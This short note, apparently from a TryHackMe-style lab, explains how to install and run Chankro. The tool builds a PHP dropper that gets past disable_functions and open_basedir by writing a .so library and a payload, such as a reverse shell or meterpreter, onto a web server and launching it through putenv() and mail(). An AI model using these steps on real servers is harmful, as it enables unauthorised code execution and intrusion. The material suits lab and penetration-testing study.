A tool to evade disable_functions and open_basedir.

Through Chankro, we generate a PHP script that will act as a dropper, creating on the server a .so library and the binary (a meterpreter, for example) or bash script (reverse shell, for example) that we want to execute freely, and that will later call putenv() and mail() to launch the process.

Install tool:

```bash
git clone https://github.com/TarlogicSecurity/Chankro.git
cd Chankro
python2 chankro.py --help
```

Usage:
```bash
python chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html
```

--arch = Architecture of system victim 32 or 64
--input = file with your payload to execute.
--output = Name of the PHP file you are going to create; this is the file you will need to upload.
--path = It is necessary to specify the absolute path where our uploaded PHP file is located. For example, if our file is located in the uploads folder then file will be at  DOCUMENTROOT + uploads.

`/` refers to the root of your website from the public html folder. `DOCUMENT_ROOT` refers to the local path to the folder on the server that contains your website, so need to get `DOCUMENT_ROOT` from phpinfo.php for example.
